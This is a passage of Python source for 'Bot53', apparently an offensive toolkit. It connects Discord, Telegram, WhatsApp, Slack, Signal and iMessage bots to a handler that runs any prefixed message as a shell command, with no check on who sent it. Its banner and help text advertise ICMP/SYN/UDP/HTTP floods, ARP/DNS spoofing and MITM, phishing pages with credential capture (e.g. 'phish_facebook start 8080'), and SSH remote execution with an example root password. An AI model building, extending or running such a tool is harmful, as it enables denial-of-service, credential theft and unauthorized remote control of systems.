  icmp_flood 192.168.1.1 30 500
  phish_facebook start 8080
  ssh_connect myserver 192.168.1.100 root password123
  nikto_full example.com
  nmap -sS -p 80,443 192.168.1.1
  curl -X GET https://api.github.com
  whois google.com{Colors.RESET}
"""
        return {'success': True, 'output': help_text}
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        return CommandExecutor.execute(command, shell=True, timeout=60)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "discord.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Discord config error: {e}")
    
    def save_config(self, token: str, prefix: str = "!"):
        self.config = {"token": token, "prefix": prefix, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "discord.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Discord config error: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("Discord.py not installed")
            return False
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                self.running = True
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="5000+ Security Commands | !help"))
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(self.config.get('prefix', '!')):
                    cmd = message.content[1:].strip()
                    result = self.handler.execute_command(cmd, f"discord/{message.author.name}")
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "...\n(truncated)"
                    embed = discord.Embed(title="🕶️ Bot53 Response", description=f"```{output}```", color=0x5865F2)
                    embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                    await message.channel.send(embed=embed)
                await self.bot.process_commands(message)
            
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Start Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            threading.Thread(target=self._run_discord_bot, daemon=True).start()
            logger.info("Discord bot started")
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "telegram.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Telegram config error: {e}")
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = None):
        self.config = {"api_id": api_id, "api_hash": api_hash, "bot_token": bot_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "telegram.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Telegram config error: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        try:
            self.client = TelegramClient('bot53_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage)
            async def message_handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    cmd = event.message.text[1:].strip()
                    result = self.handler.execute_command(cmd, f"telegram/{event.sender_id}")
                    output = result.get('output', '')
                    if len(output) > 4000:
                        output = output[:3900] + "\n... (truncated)"
                    await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", parse_mode='markdown')
            
            await self.client.start(bot_token=self.config.get('bot_token'))
            logger.info("Telegram bot connected")
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Start Telegram bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self._run_telegram_bot, daemon=True).start()
            logger.info("Telegram bot started")
            return True
        return False
    
    def _run_telegram_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "whatsapp.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load WhatsApp config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "whatsapp.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save WhatsApp config error: {e}")
            return False
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not installed")
            return False
        try:
            chrome_options = Options()
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=800,600")
            user_data_dir = os.path.join(WHATSAPP_SESSION_DIR, "chrome_data")
            chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
            if WEBDRIVER_MANAGER_AVAILABLE:
                from selenium.webdriver.chrome.service import Service
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.get("https://web.whatsapp.com")
            logger.info("WhatsApp Web opened. Please scan QR code.")
            self.running = True
            threading.Thread(target=self._monitor_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start WhatsApp bot error: {e}")
            return False
    
    def _monitor_messages(self):
        try:
            wait = WebDriverWait(self.driver, 30)
            while self.running:
                try:
                    messages = self.driver.find_elements(By.CSS_SELECTOR, "div.message-in")
                    for msg in messages:
                        try:
                            text_elem = msg.find_element(By.CSS_SELECTOR, "span.selectable-text")
                            text = text_elem.text
                            if text and text.startswith('/'):
                                cmd = text[1:].strip()
                                result = self.handler.execute_command(cmd, "whatsapp")
                                response = result.get('output', '')
                                if len(response) > 1000:
                                    response = response[:1000] + "..."
                                input_box = self.driver.find_element(By.CSS_SELECTOR, "div[contenteditable='true']")
                                input_box.send_keys(response)
                                input_box.send_keys(Keys.ENTER)
                        except:
                            pass
                    time.sleep(2)
                except Exception as e:
                    logger.error(f"WhatsApp monitor error: {e}")
                    time.sleep(5)
        except Exception as e:
            logger.error(f"WhatsApp monitor error: {e}")
    
    def stop(self):
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("WhatsApp bot started")
            return True
        return False

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "slack.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Slack config error: {e}")
    
    def save_config(self, bot_token: str, app_token: str = None):
        self.config = {"bot_token": bot_token, "app_token": app_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "slack.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Slack config error: {e}")
            return False
    
    def start(self):
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        try:
            self.client = WebClient(token=self.config['bot_token'])
            if self.config.get('app_token'):
                socket_client = SocketModeClient(app_token=self.config['app_token'], web_client=self.client)
                @socket_client.socket_mode_request_listeners.append
                def process_events(client, req):
                    if req.type == "events_api":
                        event = req.payload.get("event", {})
                        if event.get("type") == "message" and event.get("text", "").startswith('!'):
                            cmd = event["text"][1:].strip()
                            result = self.handler.execute_command(cmd, f"slack/{event.get('user', 'unknown')}")
                            self.client.chat_postMessage(channel=event["channel"], text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                socket_client.connect()
                logger.info("Slack bot connected")
                self.running = True
                while self.running:
                    time.sleep(1)
            return True
        except Exception as e:
            logger.error(f"Start Slack bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Slack bot started")
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "signal.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Signal config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "signal.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Signal config error: {e}")
            return False
    
    def start(self):
        if not SIGNAL_CLI_AVAILABLE:
            logger.error("signal-cli not found")
            return False
        try:
            self.running = True
            threading.Thread(target=self._receive_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start Signal bot error: {e}")
            return False
    
    def _receive_messages(self):
        while self.running:
            try:
                receive_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'receive']
                result = subprocess.run(receive_cmd, capture_output=True, text=True, timeout=60)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Message:' in line:
                            parts = line.split('Message:')
                            if len(parts) > 1:
                                msg = parts[1].strip()
                                if msg.startswith('!'):
                                    cmd = msg[1:].strip()
                                    cmd_result = self.handler.execute_command(cmd, "signal")
                                    self._send_message(cmd_result.get('output', '')[:1000])
                time.sleep(5)
            except Exception as e:
                logger.error(f"Signal receive error: {e}")
                time.sleep(10)
    
    def _send_message(self, message: str):
        try:
            send_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'send', '-m', message]
            subprocess.run(send_cmd, timeout=30)
        except Exception as e:
            logger.error(f"Signal send error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Signal bot started")
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "imessage.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load iMessage config error: {e}")
    
    def save_config(self, phone_numbers: List[str] = None):
        self.config = {"phone_numbers": phone_numbers or [], "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "imessage.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save iMessage config error: {e}")
            return False
    
    def start(self):
        if not IMESSAGE_AVAILABLE:
            logger.error("iMessage only available on macOS")
            return False
        try:
            self.running = True
            threading.Thread(target=self._monitor_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start iMessage bot error: {e}")
            return False
    
    def _monitor_messages(self):
        last_checked = {}
        while self.running:
            try:
                for number in self.config.get('phone_numbers', []):
                    messages = self._get_messages_from_number(number, last_checked.get(number))
                    for msg in messages:
                        text = msg['text']
                        if text.startswith('!'):
                            cmd = text[1:].strip()
                            result = self.handler.execute_command(cmd, f"imessage/{number}")
                            self._send_message(number, result.get('output', '')[:1000])
                    if messages:
                        last_checked[number] = messages[0]['timestamp']
                time.sleep(5)
            except Exception as e:
                logger.error(f"iMessage monitor error: {e}")
                time.sleep(10)
    
    def _get_messages_from_number(self, phone_number: str, since: float = None) -> List[Dict]:
        messages = []
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{phone_number}" of targetService
                set recentMessages to messages of targetBuddy
                set messageList to {{}}
                repeat with i from 1 to count of recentMessages
                    if i > 10 then exit repeat
                    set msg to item i of recentMessages
                    set end of messageList to {{text:content of msg, timestamp:date of msg}}
                end repeat
                return messageList
            end tell
            '''
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.strip().split(', '):
                    if ':' in line:
                        messages.append({'text': line, 'timestamp': time.time()})
        except Exception as e:
            logger.error(f"Get iMessages error: {e}")
        return messages
    
    def _send_message(self, recipient: str, message: str):
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{recipient}" of targetService
                send "{message}" to targetBuddy
            end tell
            '''
            subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except Exception as e:
            logger.error(f"Send iMessage error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled') and IMESSAGE_AVAILABLE:
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("iMessage bot started")
            return True
        return False

# =====================
# MAIN APPLICATION
# =====================
class Bot53:
    def __init__(self):
        self.db = DatabaseManager()
        self.spoof_engine = SpoofingEngine(self.db)
        self.traffic_gen = TrafficGenerator(self.db)
        self.phishing_server = PhishingServer(self.db)
        self.ssh_manager = SSHManager(self.db)
        self.nikto_scanner = NiktoScanner(self.db)
        self.handler = CommandHandler(self.db, self.spoof_engine, self.traffic_gen, self.phishing_server, self.ssh_manager, self.nikto_scanner)
        self.discord_bot = DiscordBot(self.handler, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.signal_bot = SignalBot(self.handler, self.db)
        self.imessage_bot = iMessageBot(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.BOLD}{Colors.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYAN}                                                                                       {Colors.MAGENTA}║
║{Colors.CYAN}                         🤖 BOT53                                                      {Colors.MAGENTA}║
║{Colors.CYAN}                                                                                        {Colors.MAGENTA}║
║{Colors.CYAN}                                                                                      {Colors.MAGENTA}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}  🤖 PLATFORMS:    Discord • Telegram • WhatsApp • Slack • Signal • iMessage          {Colors.MAGENTA}║
║{Colors.GREEN}  🎭 SPOOFING:     IP • MAC • ARP • DNS Spoofing • MITM                                {Colors.MAGENTA}║
║{Colors.GREEN}  💥 ATTACKS:      ICMP • SYN • UDP • HTTP Floods                                      {Colors.MAGENTA}║
║{Colors.GREEN}  🎣 PHISHING:     100+ Platforms • Credential Capture                                 {Colors.MAGENTA}║
║{Colors.GREEN}  🔐 SSH:          Remote Command Execution • File Transfer                            {Colors.MAGENTA}║
║{Colors.GREEN}  🕷️ NIKTO:        Web Vulnerability Scanning • SQLi • XSS • CGI                       {Colors.MAGENTA}║
║{Colors.GREEN}  🔍 SCANNING:     Nmap • Curl • Wget • Netcat • Dig • WhoIs                           {Colors.MAGENTA}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}💡 Type 'help' for command list | 'status' for system status{Colors.RESET}
{Colors.YELLOW}🎭 Type 'spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1' for IP spoofing{Colors.RESET}
{Colors.YELLOW}🎣 Type 'phish_facebook start 8080' for phishing link{Colors.RESET}
        """
        print(banner)
    
    def setup_platforms(self):
        print(f"\n{Colors.CYAN}🤖 Bot Platform Setup{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        print(f"\n{Colors.BLUE}📱 Discord Bot{Colors.RESET}")
        discord_token = input(f"{Colors.YELLOW}Enter Discord bot token (or Enter to skip): {Colors.RESET}").strip()
        if discord_token:
            prefix = input(f"{Colors.YELLOW}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
            self.discord_bot.save_config(discord_token, prefix)
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Discord bot started!{Colors.RESET}")
            self.db.update_platform_status('discord', True, 'connected')
        else:
            self.db.update_platform_status('discord', False, 'disabled')
        
        print(f"\n{Colors.BLUE}📱 Telegram Bot{Colors.RESET}")
        api_id = input(f"{Colors.YELLOW}Enter Telegram API ID (or Enter to skip): {Colors.RESET}").strip()
        if api_id:
            api_hash = input(f"{Colors.YELLOW}Enter Telegram API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.YELLOW}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
            self.telegram_bot.save_config(api_id, api_hash, bot_token or None)
            if self.telegram_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Telegram bot started!{Colors.RESET}")
            self.db.update_platform_status('telegram', True, 'connected')
        else:
            self.db.update_platform_status('telegram', False, 'disabled')
        
        print(f"\n{Colors.BLUE}📱 WhatsApp Bot{Colors.RESET}")
        whatsapp_enable = input(f"{Colors.YELLOW}Enable WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if whatsapp_enable == 'y':
            phone = input(f"{Colors.YELLOW}Enter your WhatsApp phone number (optional): {Colors.RESET}").strip()
            self.whatsapp_bot.save_config(phone or None)
            if self.whatsapp_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ WhatsApp bot started! Scan QR code in browser.{Colors.RESET}")
            self.db.update_platform_status('whatsapp', True, 'starting')
        else:
            self.db.update_platform_status('whatsapp', False, 'disabled')
        
        print(f"\n{Colors.BLUE}📱 Slack Bot{Colors.RESET}")
        slack_token = input(f"{Colors.YELLOW}Enter Slack Bot Token (or Enter to skip): {Colors.RESET}").strip()
        if slack_token:
            app_token = input(f"{Colors.YELLOW}Enter Slack App Token (optional): {Colors.RESET}").strip()
            self.slack_bot.save_config(slack_token, app_token or None)
            if self.slack_bot.start_bot_thread():
                print(f"{Colors.GREEN}✅ Slack bot started!{Colors.RESET}")
            self.db.update_platform_status('slack', True, 'connected')
        else:
            self.db.update_platform_status('slack', False, 'disabled')
        
        print(f"\n{Colors.BLUE}📱 Signal Bot{Colors.RESET}")
        if SIGNAL_CLI_AVAILABLE:
            signal_phone = input(f"{Colors.YELLOW}Enter Signal phone number (with country code, or Enter to skip): {Colors.RESET}").strip()
            if signal_phone:
                self.signal_bot.save_config(signal_phone)
                if self.signal_bot.start_bot_thread():
                    print(f"{Colors.GREEN}✅ Signal bot started!{Colors.RESET}")
                self.db.update_platform_status('signal', True, 'connected')
            else:
                self.db.update_platform_status('signal', False, 'disabled')
        else:
            print(f"{Colors.YELLOW}⚠️ signal-cli not found. Signal bot disabled.{Colors.RESET}")
            self.db.update_platform_status('signal', False, 'signal-cli not found')
        
        print(f"\n{Colors.BLUE}📱 iMessage Bot (macOS only){Colors.RESET}")
        if IMESSAGE_AVAILABLE:
            imessage_enable = input(f"{Colors.YELLOW}Enable iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if imessage_enable == 'y':
                numbers = input(f"{Colors.YELLOW}Enter phone numbers to monitor (space-separated): {Colors.RESET}").strip()
                number_list = numbers.split() if numbers else []
                self.imessage_bot.save_config(number_list)
                if self.imessage_bot.start_bot_thread():
                    print(f"{Colors.GREEN}✅ iMessage bot started!{Colors.RESET}")
                self.db.update_platform_status('imessage', True, 'connected')
            else:
                self.db.update_platform_status('imessage', False, 'disabled')
        else:
            print(f"{Colors.YELLOW}⚠️ iMessage only available on macOS{Colors.RESET}")
            self.db.update_platform_status('imessage', False, 'macOS only')
        
        print(f"\n{Colors.GREEN}✅ Platform setup complete!{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.discord_bot.load_config()
        self.telegram_bot.load_config()
        self.whatsapp_bot.load_config()
        self.slack_bot.load_config()
        self.signal_bot.load_config()
        self.imessage_bot.load_config()
        
        if not os.path.exists(os.path.join(CONFIG_DIR, "discord.json")):
            self.setup_platforms()
        else:
            if self.discord_bot.config.get('enabled'):
                self.discord_bot.start_bot_thread()
            if self.telegram_bot.config.get('enabled'):
                self.telegram_bot.start_bot_thread()
            if self.whatsapp_bot.config.get('enabled'):
                self.whatsapp_bot.start_bot_thread()
            if self.slack_bot.config.get('enabled'):
                self.slack_bot.start_bot_thread()
            if self.signal_bot.config.get('enabled'):
                self.signal_bot.start_bot_thread()
            if self.imessage_bot.config.get('enabled'):
                self.imessage_bot.start_bot_thread()
        
        print(f"\n{Colors.GREEN}✅ BOT53 ready! Bots are running in background.{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Reports: {REPORT_DIR}{Colors.RESET}")
        print(f"\n{Colors.BOLD}Type 'help' for commands | 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.MAGENTA}🤖{Colors.RESET} "
                command = input(prompt).strip()
                if not command:
                    continue
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.YELLOW}👋 Shutting down BOT53...{Colors.RESET}")
                    break
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                    continue
                result = self.handler.execute_command(command)
                if result.get('success'):
                    output = result.get('output', '')
                    if isinstance(output, dict):
                        output = json.dumps(output, indent=2)
                    print(output)
                    if result.get('execution_time'):
                        print(f"\n{Colors.GREEN}✅ Executed in {result['execution_time']:.2f}s{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Error: {result.get('output', 'Unknown error')}{Colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.phishing_server.stop()
        self.spoof_engine.stop_spoofing()
        self.traffic_gen.stop_generation()
        self.whatsapp_bot.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")

def main():
    try:
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher required{Colors.RESET}")
            sys.exit(1)
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.YELLOW}⚠️ Warning: Running without root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Advanced features (ARP spoofing, MAC spoofing) require root{Colors.RESET}")
            time.sleep(2)
        app = Bot53()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()